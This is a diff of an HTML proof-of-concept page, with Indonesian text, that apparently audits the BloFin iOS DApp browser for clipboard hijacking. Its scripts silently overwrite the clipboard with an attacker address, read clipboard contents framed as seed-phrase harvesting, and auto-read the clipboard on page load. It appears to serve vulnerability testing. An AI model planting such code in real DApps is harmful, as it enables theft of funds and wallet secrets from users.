@@ -1,64 +1,149 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BloFin v5 Final PoC - 0x403for</title>
-<style>
-body{background:#000;color:#ddd;font-family:monospace;padding:12px;font-size:13px}
-h3{color:#f5c518} 
-.box{background:#111;border:1px solid #333;padding:12px;border-radius:10px;margin:10px 0}
-button{width:100%;padding:14px;margin:6px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px;font-size:13px}
-pre{background:#000;border:1px solid #333;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;color:#0ff;min-height:80px}
-span{color:#888;font-size:11px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BloFin DApp Browser - Clipboard Real Exploit/Test Scenarios</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #0b0e14;
+            color: #f0f6fc;
+            padding: 16px;
+            margin: 0;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        h2 {
+            font-size: 18px;
+            color: #58a6ff;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 8px;
+        }
+        .box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 12px;
+        }
+        button {
+            width: 100%;
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button.danger {
+            background: #da3633;
+        }
+        button:active {
+            opacity: 0.8;
+        }
+        pre {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            overflow-x: auto;
+            color: #7ee787;
+            margin: 0;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        .badge-success { background: #238636; color: #fff; }
+        .badge-failed { background: #da3633; color: #fff; }
+    </style>
 </head>
 <body>
-<h3>BloFin iOS v5 Final PoC - Clipboard Hijack</h3>
 
-<div class="box">
-<span>Alamat TUJUAN ASLI yang di-copy user (simulasi dari Notes):</span>
-<pre id="victim">0x1111111111111111111111111111111111111111</pre>
-<button onclick="copyVictim()">1. COPY alamat asli (simulasi user copy)</button>
-</div>
+<div class="container">
+    <h2>Real Scenario: iOS DApp Browser Clipboard Audit</h2>
 
-<div class="box">
-<span>Alamat OVERWRITE oleh DApp jahat (simulasi attacker):</span>
-<pre id="attacker">0x403forTEST_BloFin_Clipboard_Hijack_1_8_5</pre>
-<button onclick="hijack()">2. OVERWRITE clipboard (aksi DApp jahat)</button>
-</div>
+    <div class="box">
+        <h3>1. writeText (Silent Payload Overwrite)</h3>
+        <p style="font-size: 13px; color: #8b949e;">Mengganti isi clipboard secara instan dengan address penyerang tanpa klik/konfirmasi.</p>
+        <label style="font-size: 12px;">Payload yang akan diinjeksikan:</label>
+        <input type="text" id="payloadInput" value="0xMaliciousAttackerAddressFake123456789" style="width:100%; padding:8px; background:#0d1117; border:1px solid #30363d; color:#fff; border-radius:4px; margin-top:4px; box-sizing:border-box;">
+        <button class="danger" onclick="executeSilentWrite()">Eksekusi Silent Overwrite</button>
+        <div style="margin-top: 8px; font-size: 12px;">Status: <span id="writeStatus" class="status-badge badge-failed">Belum diuji</span></div>
+    </div>
 
-<div class="box">
-<span>Hasil clipboard sekarang (paste di sini untuk cek):</span>
-<pre id="log">Belum ada aksi - Ready BloFin iOS 1.8.5</pre>
-<button onclick="check()">3. CHECK isi clipboard sekarang</button>
+    <div class="box">
+        <h3>2. readText (Silent Seedphrase/Data Harvesting)</h3>
+        <p style="font-size: 13px; color: #8b949e;">Membaca isi clipboard pengguna secara diam-diam (misalnya setelah korban copy seed phrase dari tempat lain).</p>
+        <button onclick="executeSilentRead()">Eksekusi Silent Read</button>
+        <div style="margin-top: 8px; font-size: 12px; margin-bottom: 8px;">Status: <span id="readStatus" class="status-badge badge-failed">Belum diuji</span></div>
+        <pre id="readOutput">Hasil data clipboard: [Kosong]</pre>
+    </div>
+
+    <div class="box">
+        <h3>3. Auto-Hook on DApp Load</h3>
+        <p style="font-size: 13px; color: #8b949e;">Mencoba mengambil isi clipboard secara otomatis begitu halaman terbuka tanpa interaksi pengguna sama sekali.</p>
+        <pre id="autoHookOutput">Memeriksa auto-hook saat halaman dimuat...</pre>
+    </div>
 </div>
 
 <script>
-const log = document.getElementById('log');
-const out = (m)=>{ log.innerText = m; console.log(m); }
+    // Skenario 3: Auto-Hook saat DApp pertama kali dibuka di WebView
+    window.addEventListener('DOMContentLoaded', async () => {
+        const hookOut = document.getElementById('autoHookOutput');
+        try {
+            const clipboardData = await navigator.clipboard.readText();
+            hookOut.innerText = "CRITICAL: Berhasil auto-read saat load!\nIsi: " + clipboardData;
+            hookOut.style.color = "#ff7b72";
+        } catch (err) {
+            hookOut.innerText = "Auto-read diblokir saat load awal (Aman): " + err.message;
+            hookOut.style.color = "#7ee787";
+        }
+    });
 
-async function copyVictim(){
- const txt = document.getElementById('victim').innerText;
- try{
-  await navigator.clipboard.writeText(txt);
-  out("STEP 1 SUCCESS: User copy alamat asli\n"+txt+"\n\nSekarang clipboard berisi alamat ASLI.");
- }catch(e){ out("STEP 1 BLOCKED (SECURE): "+e.message); }
-}
+    // Skenario 1: Real Write Execution
+    async function executeSilentWrite() {
+        const payload = document.getElementById('payloadInput').value;
+        const statusBadge = document.getElementById('writeStatus');
+        
+        try {
+            await navigator.clipboard.writeText(payload);
+            statusBadge.innerText = "SUCCESS (Clipboard Di-overwrite)";
+            statusBadge.className = "status-badge badge-success";
+            alert("Berhasil overwrite clipboard tanpa prompt iOS!");
+        } catch (err) {
+            statusBadge.innerText = "FAILED: " + err.message;
+            statusBadge.className = "status-badge badge-failed";
+        }
+    }
 
-async function hijack(){
- const txt = document.getElementById('attacker').innerText;
- try{
-  await navigator.clipboard.writeText(txt);
-  out("STEP 2 SUCCESS (BUG!): DApp berhasil OVERWRITE clipboard!\nMenjadi:\n"+txt+"\n\n=> Jika user paste di halaman Send BloFin, dana akan terkirim ke alamat overwrite, bukan alamat asli!");
- }catch(e){ out("STEP 2 BLOCKED (SECURE): "+e.message); }
-}
+    // Skenario 2: Real Read Execution
+    async function executeSilentRead() {
+        const statusBadge = document.getElementById('readStatus');
+        const outputPre = document.getElementById('readOutput');
 
-async function check(){
- try{
-  const t = await navigator.clipboard.readText();
-  out("STEP 3 CHECK: Isi clipboard sekarang:\n"+t);
- }catch(e){ out("CHECK BLOCKED: "+e.message); }
-}
+        try {
+            const text = await navigator.clipboard.readText();
+            statusBadge.innerText = "SUCCESS (Data Tercuri)";
+            statusBadge.className = "status-badge badge-success";
+            outputPre.innerText = text ? text : "[Clipboard Kosong / Mengembalikan String Kosong]";
+        } catch (err) {
+            statusBadge.innerText = "FAILED / BLOCKED";
+            statusBadge.className = "status-badge badge-failed";
+            outputPre.innerText = "Error: " + err.message;
+        }
+    }
 </script>
+
 </body>
 </html>
